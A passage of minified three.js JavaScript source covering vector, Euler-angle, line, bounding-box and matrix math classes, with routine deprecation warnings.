a){console.warn(\"THREE.Vector3: setFromMatrixColumn now expects ( matrix, index ).\");var c=a;a=b;b=c}return this.fromArray(a.elements,4*b)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===\nb&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+c;this.x=a.array[b];this.y=a.array[b+1];this.z=a.array[b+2];return this}};THREE.Vector4=function(a,b,c,d){this.x=a||0;this.y=b||0;this.z=c||0;this.w=void 0!==d?d:1};\nTHREE.Vector4.prototype={constructor:THREE.Vector4,set:function(a,b,c,d){this.x=a;this.y=b;this.z=c;this.w=d;return this},setScalar:function(a){this.w=this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setW:function(a){this.w=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;case 3:this.w=b;break;default:throw Error(\"index is out of range: \"+\na);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=void 0!==a.w?a.w:1;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);\nthis.x+=a.x;this.y+=a.y;this.z+=a.z;this.w+=a.w;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;this.w+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;this.w=a.w+b.w;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;this.w+=a.w*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=\na.x;this.y-=a.y;this.z-=a.z;this.w-=a.w;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;this.w-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;this.w=a.w-b.w;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a,this.w*=a):this.w=this.z=this.y=this.x=0;return this},applyMatrix4:function(a){var b=this.x,c=this.y,d=this.z,e=this.w;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12]*e;this.y=a[1]*b+a[5]*c+a[9]*d+a[13]*e;this.z=\na[2]*b+a[6]*c+a[10]*d+a[14]*e;this.w=a[3]*b+a[7]*c+a[11]*d+a[15]*e;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},setAxisAngleFromQuaternion:function(a){this.w=2*Math.acos(a.w);var b=Math.sqrt(1-a.w*a.w);1E-4>b?(this.x=1,this.z=this.y=0):(this.x=a.x/b,this.y=a.y/b,this.z=a.z/b);return this},setAxisAngleFromRotationMatrix:function(a){var b,c,d;a=a.elements;var e=a[0];d=a[4];var f=a[8],g=a[1],h=a[5],k=a[9];c=a[2];b=a[6];var l=a[10];if(.01>Math.abs(d-g)&&.01>Math.abs(f-c)&&.01>\nMath.abs(k-b)){if(.1>Math.abs(d+g)&&.1>Math.abs(f+c)&&.1>Math.abs(k+b)&&.1>Math.abs(e+h+l-3))return this.set(1,0,0,0),this;a=Math.PI;e=(e+1)/2;h=(h+1)/2;l=(l+1)/2;d=(d+g)/4;f=(f+c)/4;k=(k+b)/4;e>h&&e>l?.01>e?(b=0,d=c=.707106781):(b=Math.sqrt(e),c=d/b,d=f/b):h>l?.01>h?(b=.707106781,c=0,d=.707106781):(c=Math.sqrt(h),b=d/c,d=k/c):.01>l?(c=b=.707106781,d=0):(d=Math.sqrt(l),b=f/d,c=k/d);this.set(b,c,d,a);return this}a=Math.sqrt((b-k)*(b-k)+(f-c)*(f-c)+(g-d)*(g-d));.001>Math.abs(a)&&(a=1);this.x=(b-k)/\na;this.y=(f-c)/a;this.z=(g-d)/a;this.w=Math.acos((e+h+l-1)/2);return this},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);this.w=Math.min(this.w,a.w);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=Math.max(this.z,a.z);this.w=Math.max(this.w,a.w);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));\nthis.w=Math.max(a.w,Math.min(b.w,this.w));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector4,b=new THREE.Vector4);a.set(c,c,c,c);b.set(d,d,d,d);return this.clamp(a,b)}}(),floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);this.z=Math.floor(this.z);this.w=Math.floor(this.w);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);this.w=Math.ceil(this.w);return this},round:function(){this.x=\nMath.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);this.w=Math.round(this.w);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);this.w=0>this.w?Math.ceil(this.w):Math.floor(this.w);return this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;this.w=-this.w;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*\na.z+this.w*a.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-\nthis.z)*b;this.w+=(a.w-this.w)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z&&a.w===this.w},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];this.w=a[b+3];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;a[b+3]=this.w;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+\nc;this.x=a.array[b];this.y=a.array[b+1];this.z=a.array[b+2];this.w=a.array[b+3];return this}};THREE.Euler=function(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._order=d||THREE.Euler.DefaultOrder};THREE.Euler.RotationOrders=\"XYZ YZX ZXY XZY YXZ ZYX\".split(\" \");THREE.Euler.DefaultOrder=\"XYZ\";\nTHREE.Euler.prototype={constructor:THREE.Euler,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get order(){return this._order},set order(a){this._order=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._order=d||this._order;this.onChangeCallback();return this},clone:function(){return new this.constructor(this._x,\nthis._y,this._z,this._order)},copy:function(a){this._x=a._x;this._y=a._y;this._z=a._z;this._order=a._order;this.onChangeCallback();return this},setFromRotationMatrix:function(a,b,c){var d=THREE.Math.clamp,e=a.elements;a=e[0];var f=e[4],g=e[8],h=e[1],k=e[5],l=e[9],n=e[2],p=e[6],e=e[10];b=b||this._order;\"XYZ\"===b?(this._y=Math.asin(d(g,-1,1)),.99999>Math.abs(g)?(this._x=Math.atan2(-l,e),this._z=Math.atan2(-f,a)):(this._x=Math.atan2(p,k),this._z=0)):\"YXZ\"===b?(this._x=Math.asin(-d(l,-1,1)),.99999>Math.abs(l)?\n(this._y=Math.atan2(g,e),this._z=Math.atan2(h,k)):(this._y=Math.atan2(-n,a),this._z=0)):\"ZXY\"===b?(this._x=Math.asin(d(p,-1,1)),.99999>Math.abs(p)?(this._y=Math.atan2(-n,e),this._z=Math.atan2(-f,k)):(this._y=0,this._z=Math.atan2(h,a))):\"ZYX\"===b?(this._y=Math.asin(-d(n,-1,1)),.99999>Math.abs(n)?(this._x=Math.atan2(p,e),this._z=Math.atan2(h,a)):(this._x=0,this._z=Math.atan2(-f,k))):\"YZX\"===b?(this._z=Math.asin(d(h,-1,1)),.99999>Math.abs(h)?(this._x=Math.atan2(-l,k),this._y=Math.atan2(-n,a)):(this._x=\n0,this._y=Math.atan2(g,e))):\"XZY\"===b?(this._z=Math.asin(-d(f,-1,1)),.99999>Math.abs(f)?(this._x=Math.atan2(p,k),this._y=Math.atan2(g,a)):(this._x=Math.atan2(-l,e),this._y=0)):console.warn(\"THREE.Euler: .setFromRotationMatrix() given unsupported order: \"+b);this._order=b;if(!1!==c)this.onChangeCallback();return this},setFromQuaternion:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeRotationFromQuaternion(b);return this.setFromRotationMatrix(a,c,d)}}(),setFromVector3:function(a,\nb){return this.set(a.x,a.y,a.z,b||this._order)},reorder:function(){var a=new THREE.Quaternion;return function(b){a.setFromEuler(this);return this.setFromQuaternion(a,b)}}(),equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._order===this._order},fromArray:function(a){this._x=a[0];this._y=a[1];this._z=a[2];void 0!==a[3]&&(this._order=a[3]);this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;\na[b+3]=this._order;return a},toVector3:function(a){return a?a.set(this._x,this._y,this._z):new THREE.Vector3(this._x,this._y,this._z)},onChange:function(a){this.onChangeCallback=a;return this},onChangeCallback:function(){}};THREE.Line3=function(a,b){this.start=void 0!==a?a:new THREE.Vector3;this.end=void 0!==b?b:new THREE.Vector3};\nTHREE.Line3.prototype={constructor:THREE.Line3,set:function(a,b){this.start.copy(a);this.end.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.start.copy(a.start);this.end.copy(a.end);return this},center:function(a){return(a||new THREE.Vector3).addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(a){return(a||new THREE.Vector3).subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},\nat:function(a,b){var c=b||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},closestPointToPointParameter:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,d){a.subVectors(c,this.start);b.subVectors(this.end,this.start);var e=b.dot(b),e=b.dot(a)/e;d&&(e=THREE.Math.clamp(e,0,1));return e}}(),closestPointToPoint:function(a,b,c){a=this.closestPointToPointParameter(a,b);c=c||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},applyMatrix4:function(a){this.start.applyMatrix4(a);\nthis.end.applyMatrix4(a);return this},equals:function(a){return a.start.equals(this.start)&&a.end.equals(this.end)}};THREE.Box2=function(a,b){this.min=void 0!==a?a:new THREE.Vector2(Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector2(-Infinity,-Infinity)};\nTHREE.Box2.prototype={constructor:THREE.Box2,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandByPoint(a[b]);return this},setFromCenterAndSize:function(){var a=new THREE.Vector2;return function(b,c){var d=a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);\nreturn this},makeEmpty:function(){this.min.x=this.min.y=Infinity;this.max.x=this.max.y=-Infinity;return this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y},center:function(a){return(a||new THREE.Vector2).addVectors(this.min,this.max).multiplyScalar(.5)},size:function(a){return(a||new THREE.Vector2).subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);\nthis.max.addScalar(a);return this},containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y?!0:!1},getParameter:function(a,b){return(b||new THREE.Vector2).set((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-this.min.y))},intersectsBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>\nthis.max.y?!1:!0},clampPoint:function(a,b){return(b||new THREE.Vector2).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector2;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&\na.max.equals(this.max)}};THREE.Box3=function(a,b){this.min=void 0!==a?a:new THREE.Vector3(Infinity,Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector3(-Infinity,-Infinity,-Infinity)};\nTHREE.Box3.prototype={constructor:THREE.Box3,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromArray:function(a){for(var b=Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,k=a.length;h<k;h+=3){var l=a[h],n=a[h+1],p=a[h+2];l<b&&(b=l);n<c&&(c=n);p<d&&(d=p);l>e&&(e=l);n>f&&(f=n);p>g&&(g=p)}this.min.set(b,c,d);this.max.set(e,f,g)},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandByPoint(a[b]);return this},setFromCenterAndSize:function(){var a=\nnew THREE.Vector3;return function(b,c){var d=a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return this}}(),setFromObject:function(){var a=new THREE.Vector3;return function(b){var c=this;b.updateMatrixWorld(!0);this.makeEmpty();b.traverse(function(b){var e=b.geometry;if(void 0!==e)if(e instanceof THREE.Geometry)for(var f=e.vertices,e=0,g=f.length;e<g;e++)a.copy(f[e]),a.applyMatrix4(b.matrixWorld),c.expandByPoint(a);else if(e instanceof THREE.BufferGeometry&&void 0!==\ne.attributes.position)for(f=e.attributes.position.array,e=0,g=f.length;e<g;e+=3)a.fromArray(f,e),a.applyMatrix4(b.matrixWorld),c.expandByPoint(a)});return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=this.min.z=Infinity;this.max.x=this.max.y=this.max.z=-Infinity;return this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},\ncenter:function(a){return(a||new THREE.Vector3).addVectors(this.min,this.max).multiplyScalar(.5)},size:function(a){return(a||new THREE.Vector3).subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y||a.z<\nthis.min.z||a.z>this.max.z?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y&&this.min.z<=a.min.z&&a.max.z<=this.max.z?!0:!1},getParameter:function(a,b){return(b||new THREE.Vector3).set((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-this.min.y),(a.z-this.min.z)/(this.max.z-this.min.z))},intersectsBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y||a.max.z<\nthis.min.z||a.min.z>this.max.z?!1:!0},intersectsSphere:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);this.clampPoint(b.center,a);return a.distanceToSquared(b.center)<=b.radius*b.radius}}(),intersectsPlane:function(a){var b,c;0<a.normal.x?(b=a.normal.x*this.min.x,c=a.normal.x*this.max.x):(b=a.normal.x*this.max.x,c=a.normal.x*this.min.x);0<a.normal.y?(b+=a.normal.y*this.min.y,c+=a.normal.y*this.max.y):(b+=a.normal.y*this.max.y,c+=a.normal.y*this.min.y);0<a.normal.z?(b+=a.normal.z*\nthis.min.z,c+=a.normal.z*this.max.z):(b+=a.normal.z*this.max.z,c+=a.normal.z*this.min.z);return b<=a.constant&&c>=a.constant},clampPoint:function(a,b){return(b||new THREE.Vector3).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector3;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),getBoundingSphere:function(){var a=new THREE.Vector3;return function(b){b=b||new THREE.Sphere;b.center=this.center();b.radius=.5*this.size(a).length();return b}}(),\nintersect:function(a){this.min.max(a.min);this.max.min(a.max);this.isEmpty()&&this.makeEmpty();return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},applyMatrix4:function(){var a=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3];return function(b){if(this.isEmpty())return this;a[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(b);a[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(b);\na[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(b);a[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(b);a[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(b);a[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(b);a[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(b);a[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(b);this.setFromPoints(a);return this}}(),translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&\na.max.equals(this.max)}};THREE.Matrix3=function(){this.elements=new Float32Array([1,0,0,0,1,0,0,0,1]);0<arguments.length&&console.error(\"THREE.Matrix3: the constructor no longer reads arguments. use .set() instead.\")};\nTHREE.Matrix3.prototype={constructor:THREE.Matrix3,set:function(a,b,c,d,e,f,g,h,k){var l=this.elements;l[0]=a;l[1]=d;l[2]=g;l[3]=b;l[4]=e;l[5]=h;l[6]=c;l[7]=f;l[8]=k;return this},identity:function(){this.set(1,0,0,0,1,0,0,0,1);return this},clone:function(){return(new this.constructor).fromArray(this.elements)},copy:function(a){a=a.elements;this.set(a[0],a[3],a[6],a[1],a[4],a[7],a[2],a[5],a[8]);return this},setFromMatrix4:function(a){a=a.elements;this.set(a[0],a[4],a[8],a[1],a[5],a[9],a[2],a[6],a[10]);\nreturn this},applyToVector3Array:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Vector3);void 0===c&&(c=0);void 0===d&&(d=b.length);for(var e=0;e<d;e+=3,c+=3)a.fromArray(b,c),a.applyMatrix3(this),a.toArray(b,c);return b}}(),applyToBuffer:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Vector3);void 0===c&&(c=0);void 0===d&&(d=b.length/b.itemSize);for(var e=0;e<d;e++,c++)a.x=b.getX(c),a.y=b.getY(c),a.z=b.getZ(c),a.applyMatrix3(this),b.setXYZ(a.x,a.y,a.z);return b}}(),\nmultiplyScalar:function(a){var b=this.elements;b[0]*=a;b[3]*=a;b[6]*=a;b[1]*=a;b[4]*=a;b[7]*=a;b[2]*=a;b[5]*=a;b[8]*=a;return this},determinant:function(){var a=this.elements,b=a[0],c=a[1],d=a[2],e=a[3],f=a[4],g=a[5],h=a[6],k=a[7],a=a[8];return b*f*a-b*g*k-c*e*a+c*g*h+d*e*k-d*f*h},getInverse:function(a,b){a instanceof THREE.Matrix4&&console.error(\"THREE.Matrix3.getInverse no longer takes a Matrix4 argument.\");var c=a.elements,d=this.elements,e=c[0],f=c[1],g=c[2],h=c[3],k=c[4],l=c[5],n=c[6],p=c[7],\nc=c[8],m=c*k-l*p,q=l*n-c*h,r=p*h-k*n,s=e*m+f*q+g*r;if(0===s){if(b)throw Error(\"THREE.Matrix3.getInverse(): can't invert matrix, determinant is 0\");console.warn(\"THREE.Matrix3.getInverse(): can't invert matrix, determinant is 0\");return this.identity()}s=1/s;d[0]=m*s;d[1]=(g*p-c*f)*s;d[2]=(l*f-g*k)*s;d[3]=q*s;d[4]=(c*e-g*n)*s;d[5]=(g*h-l*e)*s;d[6]=r*s;d[7]=(f*n-p*e)*s;d[8]=(k*e-f*h)*s;return this},transpose:function(){var a,b=this.elements;a=b[1];b[1]=b[3];b[3]=a;a=b[2];b[2]=b[6];b[6]=a;a=b[5];b[5]=\nb[7];b[7]=a;return this},flattenToArrayOffset:function(a,b){console.warn(\"THREE.Matrix3: .flattenToArrayOffset is deprecated - just use .toArray instead.\");return this.toArray(a,b)},getNormalMatrix:function(a){return this.setFromMatrix4(a).getInverse(this).transpose()},transposeIntoArray:function(a){var b=this.elements;a[0]=b[0];a[1]=b[3];a[2]=b[6];a[3]=b[1];a[4]=b[4];a[5]=b[7];a[6]=b[2];a[7]=b[5];a[8]=b[8];return this},fromArray:function(a){this.elements.set(a);return this},toArray:function(a,b){void 0===\na&&(a=[]);void 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];return a}};THREE.Matrix4=function(){this.elements=new Float32Array([1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]);0<arguments.length&&console.error(\"THREE.Matrix4: the constructor no longer reads arguments. use .set() instead.\")};\nTHREE.Matrix4.prototype={constructor:THREE.Matrix4,set:function(a,b,c,d,e,f,g,h,k,l,n,p,m,q,r,s){var t=this.elements;t[0]=a;t[4]=b;t[8]=c;t[12]=d;t[1]=e;t[5]=f;t[9]=g;t[13]=h;t[2]=k;t[6]=l;t[10]=n;t[14]=p;t[3]=m;t[7]=q;t[11]=r;t[15]=s;return this},identity:function(){this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1);return this},clone:function(){return(new THREE.Matrix4).fromArray(this.elements)},copy:function(a){this.elements.set(a.elements);return this},copyPosition:function(a){var b=this.elements;a=a.elements;\nb[12]=a[12];b[13]=a[13];b[14]=a[14];return this},extractBasis:function(a,b,c){a.setFromMatrixColumn(this,0);b.setFromMatrixColumn(this,1);c.setFromMatrixColumn(this,2);return this},makeBasis:function(a,b,c){this.set(a.x,b.x,c.x,0,a.y,b.y,c.y,0,a.z,b.z,c.z,0,0,0,0,1);return this},extractRotation:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);var c=this.elements,d=b.elements,e=1/a.setFromMatrixColumn(b,0).length(),f=1/a.setFromMatrixColumn(b,1).length();b=1/a.setFromMatrixColumn(b,\n2).length();c[0]=d[0]*e;c[1]=d[1]*e;c[2]=d[2]*e;c[4]=d[4]*f;c[5]=d[5]*f;c[6]=d[6]*f;c[8]=d[8]*b;c[9]=d[9]*b;c[10]=d[10]*b;return this}}(),makeRotationFromEuler:function(a){!1===a instanceof THREE.Euler&&console.error(\"THREE.Matrix: .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.\");var b=this.elements,c=a.x,d=a.y,e=a.z,f=Math.cos(c),c=Math.sin(c),g=Math.cos(d),d=Math.sin(d),h=Math.cos(e),e=Math.sin(e);if(\"XYZ\"===a.order){a=f*h;var k=f*e,l=c*h,n=c*e;b[0]=g*h;b[4]=\n-g*e;b[8]=d;b[1]=k+l*d;b[5]=a-n*d;b[9]=-c*g;b[2]=n-a*d;b[6]=l+k*d;b[10]=f*g}else\"YXZ\"===a.order?(a=g*h,k=g*e,l=d*h,n=d*e,b[0]=a+n*c,b[4]=l*c-k,b[8]=f*d,b[1]=f*e,b[5]=f*h,b[9]=-c,b[2]=k*c-l,b[6]=n+a*c,b[10]=f*g):\"ZXY\"===a.order?(a=g*h,k=g*e,l=d*h,n=d*e,b[0]=a-n*c,b[4]=-f*e,b[8]=l+k*c,b[1]=k+l*c,b[5]=f*h,b[9]=n-a*c,b[2]=-f*d,b[6]=c,b[10]=f*g):\"ZYX\"===a.order?(a=f*h,k=f*e,l=c*h,n=c*e,b[0]=g*h,b[4]=l*d-k,b[8]=a*d+n,b[1]=g*e,b[5]=n*d+a,b[9]=k*d-l,b[2]=-d,b[6]=c*g,b[10]=f*g):\"YZX\"===a.order?(a=f*g,k=f*\nd,l=c*g,n=c*d,b[0]=g*h,b[4]=n-a*e,b[8]=l*e+k,b[1]=e,b[5]=f*h,b[9]=-c*h,b[2]=-d*h,b[6]=k*e+l,b[10]=a-n*e):\"XZY\"===a.order&&(a=f*g,k=f*d,l=c*g,n=c*d,b[0]=g*h,b[4]=-e,b[8]=d*h,b[1]=a*e+n,b[5]=f*h,b[9]=k*e-l,b[2]=l*e-k,b[6]=c*h,b[10]=n*e+a);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return this},makeRotationFromQuaternion:function(a){var b=this.elements,c=a.x,d=a.y,e=a.z,f=a.w,g=c+c,h=d+d,k=e+e;a=c*g;var l=c*h,c=c*k,n=d*h,d=d*k,e=e*k,g=f*g,h=f*h,f=f*k;b[0]=1-(n+e);b[4]=l-f;b[8]=c+h;b[1]=l+\nf;b[5]=1-(a+e);b[9]=d-g;b[2]=c-h;b[6]=d+g;b[10]=1-(a+n);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return this},lookAt:function(){var a,b,c;return function(d,e,f){void 0===a&&(a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3);var g=this.elements;c.subVectors(d,e).normalize();0===c.lengthSq()&&(c.z=1);a.crossVectors(f,c).normalize();0===a.lengthSq()&&(c.z+=1E-4,a.crossVectors(f,c).normalize());b.crossVectors(c,a);g[0]=a.x;g[4]=b.x;g[8]=c.x;g[1]=a.y;g[5]=b.y;g[9]=c.y;g[2]=a.z;\ng[6]=b.z;g[10]=c.z;return this}}(),multiply:function(a,b){return void 0!==b?(console.warn(\"THREE.Matrix4: .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead.\"),this.multiplyMatrices(a,b)):this.multiplyMatrices(this,a)},premultiply:function(a){return this.multiplyMatrices(a,this)},multiplyMatrices:function(a,b){var c=a.elements,d=b.elements,e=this.elements,f=c[0],g=c[4],h=c[8],k=c[12],l=c[1],n=c[5],p=c[9],m=c[13],q=c[2],r=c[6],s=c[10],t=c[14],u=c[3],v=c[7],C=c[11],c=c[15],\nw=d[0],E=d[4],z=d[8],y=d[12],A=d[1],I=d[5],B=d[9],F=d[13],K=d[2],P=d[6],M=d[10],H=d[14],L=d[3],O=d[7],N=d[11],d=d[15];e[0]=f*w+g*A+h*K+k*L;e[4]=f*E+g*I+h*P+k*O;e[8]=f*z+g*B+h*M+k*N;e[12]=f*y+g*F+h*H+k*d;e[1]=l*w+n*A+p*K+m*L;e[5]=l*E+n*I+p*P+m*O;e[9]=l*z+n*B+p*M+m*N;e[13]=l*y+n*F+p*H+m*d;e[2]=q*w+r*A+s*K+t*L;e[6]=q*E+r*I+s*P+t*O;e[10]=q*z+r*B+s*M+t*N;e[14]=q*y+r*F+s*H+t*d;e[3]=u*w+v*A+C*K+c*L;e[7]=u*E+v*I+C*P+c*O;e[11]=u*z+v*B+C*M+c*N;e[15]=u*y+v*F+C*H+c*d;return this},multiplyToArray:function(a,b,\nc){var d=this.elements;this.multiplyMatrices(a,b);c[0]=d[0];c[1]=d[1];c[2]=d[2];c[3]=d[3];c[4]=d[4];c[5]=d[5];c[6]=d[6];c[7]=d[7];c[8]=d[8];c[9]=d[9];c[10]=d[10];c[11]=d[11];c[12]=d[12];c[13]=d[13];c[14]=d[14];c[15]=d[15];return this},multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[4]*=a;b[8]*=a;b[12]*=a;b[1]*=a;b[5]*=a;b[9]*=a;b[13]*=a;b[2]*=a;b[6]*=a;b[10]*=a;b[14]*=a;b[3]*=a;b[7]*=a;b[11]*=a;b[15]*=a;return this},applyToVector3Array:function(){var a;return function(b,c,d){void 0===a&&\n(a=new THREE.Vector3);void 0===c&&(c=0);void 0===d&&(d=b.length);for(var e=0;e<d;e+=3,c+=3)a.fromArray(b,c),a.applyMatrix4(this),a.toArray(b,c);return b}}(),applyToBuffer:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Vector3);void 0===c&&(c=0);void 0===d&&(d=b.length/b.itemSize);for(var 